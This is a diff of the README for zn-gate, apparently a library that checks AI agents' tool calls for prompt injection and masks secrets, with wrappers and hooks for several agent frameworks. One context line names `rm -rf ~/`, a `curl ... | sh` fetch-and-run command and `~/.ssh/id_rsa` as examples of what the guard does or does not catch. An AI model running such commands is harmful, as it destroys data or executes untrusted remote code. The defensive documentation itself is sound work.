@@ -117,6 +117,19 @@ print(get_user_profile("user_123"))
 
 Arguments are checked before the function runs; with `on_block="raise"` a blocked call raises `GuardBlockError`. `mask_secrets` is off by default in `@guard`.
 
+`on_block="return"` returns `fallback` instead of running the function. `on_block="custom"` calls `callback(assessment, function_name, payload)` and then raises `GuardBlockError`, unless your callback raises its own exception first; it needs a `callback`, and without one the decorator raises `ValueError`. In every mode a blocked call does not run the function.
+
+The checks read every string inside the arguments: dict keys and values, lists, tuples, sets, dataclasses, pydantic models and the attributes of other objects (the `self` or `cls` of a method is skipped). The run-context objects that agent frameworks pass to a tool (pydantic-ai `RunContext`, Google ADK `ToolContext`, OpenAI Agents SDK `ToolContext` and `RunContextWrapper`, LangChain callback managers and `RunnableConfig`) are not checked, and other application objects (a client, a session, your dependencies) are read best effort: what is nested too deep to read is left out instead of blocking the call. Data models (dataclasses, pydantic, attrs) are always read in full. A generator or other one-shot iterator is blocked (rule `type:unscannable`), because checking it would use it up: pass a list instead. Strings longer than 256 KB are checked in overlapping windows up to 4 MB; past that the result has `truncated=True`, and `block_truncated=True` or `ZN_BLOCK_TRUNCATED=1` blocks it (rule `size:truncated`).
+
+#### Async tools, streamed output and errors
+
+With `check_result` or `mask_secrets` (on by default in `guarded_tool`), `@guard` and `guarded_tool` handle every form of tool output the same way:
+
+- **Async**: `async def` functions, callable objects whose `__call__` is `async def`, and sync functions that return a coroutine are awaited, then checked and masked.
+- **Streamed output**: a generator or async generator is passed on chunk by chunk. Each chunk is checked (together with the end of the previous chunk, so a phrase split in two is still found) and masked. A blocked chunk ends the stream: `GuardBlockError`, or the `fallback` as the last chunk with `on_block="return"`. A secret split across two chunks is not masked, so do not stream secrets in small pieces.
+- **Objects**: a result that is a pydantic model, a dataclass or another plain object is read field by field. With `mask_secrets` a secret inside it is masked, and the model gets the object as plain data (a dict) with the secret hidden. A secret that cannot be masked blocks the result (rule `secret:unmaskable`).
+- **Errors**: agent frameworks send the message of a tool's exception to the model (LangChain `handle_tool_error`, LangGraph `ToolNode`, the OpenAI Agents SDK, CrewAI), so it is checked and masked like the output. A blocked message raises `GuardBlockError` (or returns the `fallback`). A message with a secret is raised again as an exception of the same type that carries only the masked message, without the original exception attached; when the type cannot be rebuilt that way, `zn_gate.guard.MaskedToolError` (a `RuntimeError`) is raised instead. Other exceptions are raised unchanged.
+
 `@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
 
 Runnable example with Microsoft Semantic Kernel: [examples/semantic-kernel-agent](https://github.com/usezn/zn/tree/main/examples/semantic-kernel-agent).
@@ -135,7 +148,7 @@ handler = ZnGuardCallbackHandler(on_block="raise")
 
 The handler stops the run. With `on_block="raise"` (default) a blocked prompt, tool call or tool output raises `GuardBlockError` out of the agent: the tool does not run and the output does not reach the model. `on_block="ignore"` turns that off. `"return"` is not accepted (it raises `ValueError`), because LangChain ignores what a callback returns; any other value raises `ValueError` too.
 
-A callback cannot change what a tool returns. So with `mask_secrets=True` (default) a tool output that contains a secret also stops the run. To hide the secret and keep going, or to give the model a block message instead of the output, wrap the tool (needs `langchain-core`):
+A callback cannot change what a tool returns. So with `mask_secrets=True` (default) a tool output that contains a secret also stops the run. The same goes for a tool's error, whose text LangChain (`handle_tool_error`) and LangGraph (`ToolNode(handle_tool_errors=True)`) send to the model: when the message is blocked or contains a secret, the handler replaces the error with `GuardBlockError`, whose message holds no secret. To hide the secret and keep going, or to give the model a block message instead of the output, wrap the tool (needs `langchain-core`):
 
 ```python
 from langchain_core.tools import tool
@@ -151,7 +164,18 @@ print(safe_read_notes.invoke({"topic": "deploy"}))
 # Deploy key: [REDACTED_AWS_KEY]
 ```
 
-`guard_langchain_tool` returns a tool with the same name, description and arguments. It checks the arguments before the tool runs, checks the output for prompt injection (`check_result=True`) and hides secrets in it (`mask_secrets=True`) before the model reads it. With `on_block="return"` the model gets `fallback`, or a short block message, instead; with `"raise"` (default) it raises `GuardBlockError`. Pass the wrapped tools to your agent; use it on every tool that reads outside data or can reach files, shells or the network.
+`guard_langchain_tool` returns a tool with the same name, description and arguments. It checks the arguments before the tool runs, checks the output for prompt injection (`check_result=True`) and hides secrets in it (`mask_secrets=True`) before the model reads it. With `on_block="return"` the model gets `fallback`, or a short block message, instead; with `"raise"` (default) it raises `GuardBlockError`. Pass the wrapped tools to your agent; use it on every tool that reads outside data or can reach files, shells or the network. The wrapped tool keeps the original's `handle_tool_error`, `handle_validation_error` and `response_format="content_and_artifact"` (the content is checked and masked, the artifact is passed through unchanged and is not scanned). Arguments LangChain injects are forwarded untouched; `InjectedToolCallId` and LangGraph's `InjectedState` and `InjectedStore` are not checked (the model cannot set them), while a generic `InjectedToolArg` is checked like any other argument, because LangChain accepts a value the model sends for it.
+
+If you use the wrapper and the handler together, create the handler with `mask_secrets=False`. The handler sees the raw output of the wrapped tool, so with the default `mask_secrets=True` it would stop the run on a secret before the wrapper can hide it:
+
+```python
+handler = ZnGuardCallbackHandler(mask_secrets=False)  # the wrapped tools mask secrets
+# agent.invoke(..., config={"callbacks": [handler]}) with tools=[safe_read_notes, ...]
+```
+
+The handler still stops the run on a blocked prompt, tool call or injected output.
+
+The wrapper treats the message of an exception raised by the tool like its output. A blocked message is handled like a blocked output; a message with a secret is raised again as the same exception type carrying only the masked message, without the original exception attached, so `handle_tool_error` still turns a `ToolException` into a message for the model, now masked. Set `handle_tool_error` on the wrapped tool, not on the original.
 
 ### CrewAI
 
@@ -168,7 +192,33 @@ def query_knowledge_base(query: str) -> str:
 
 `check_result=True` also scans what the tool returns for prompt injection before the agent sees it (off by default, so existing tools behave as before).
 
-`guarded_tool` also works on `async def` tools and on callable objects whose `__call__` is `async def`: the call is awaited, then the output is checked and masked exactly as for a sync tool. A sync function that returns a coroutine, and an async generator, are not checked or masked, so declare the tool with `async def` instead.
+`guarded_tool` also works on `async def` tools, on callable objects whose `__call__` is `async def` and on sync functions that return a coroutine: the call is awaited, then the output is checked and masked exactly as for a sync tool.
+
+### Google ADK, OpenAI Agents SDK and Pydantic AI (native hooks)
+
+Tools that these frameworks supply themselves (MCP servers, for example) never pass through `@guard` or `guarded_tool`. Each framework has its own place to check a tool call and its result, and zn-gate plugs into it. The checks are the same ones `guarded_tool` runs: a blocked call does not run the tool, text that tries to give the model orders is blocked in the result, and secrets in the result are masked. Each helper loads its framework only when you call it.
+
+```python
+from zn_gate.integrations import adk_tool_callbacks, openai_agents_tool_guardrails, guard_pydantic_ai_toolset
+
+# Google ADK: LlmAgent(..., before_tool_callback=before, after_tool_callback=after)
+before, after = adk_tool_callbacks()
+
+# OpenAI Agents SDK: @function_tool(tool_input_guardrails=inputs, tool_output_guardrails=outputs)
+# (the same lists also go on MCPServerStdio and the other MCP servers)
+inputs, outputs = openai_agents_tool_guardrails()
+
+# Pydantic AI: Agent(model, toolsets=[guard_pydantic_ai_toolset(toolset)])
+```
+
+All three take `on_block` (`"return"` by default: the model gets a zn-gate message instead of the tool's result; `"raise"` stops the run), `mask_secrets`, `check_result`, `block_truncated` and `fallback`. Verified against google-adk 2.12.0, openai-agents 0.24.0 and pydantic-ai-slim 2.58.0.
+
+What is not covered:
+
+- **Google ADK**: the callbacks see only the tools of the agent they are set on, and not a tool's exceptions (`on_tool_error_callback`).
+- **OpenAI Agents SDK**: tool guardrails exist for function tools and MCP servers only. Hosted tools (web search, code interpreter and similar) have none, so they are not checked. The SDK cannot replace an output with an edited one, so a secret is masked by replacing the whole output with its masked text (JSON text for a dict or list).
+- **Pydantic AI**: tools added with `@agent.tool` are not in a toolset you hold. Put them in a `FunctionToolset` and wrap that, or use `guarded_tool`.
+- Other frameworks have no native hook yet: use `guarded_tool`.
 
 ### LlamaIndex
 
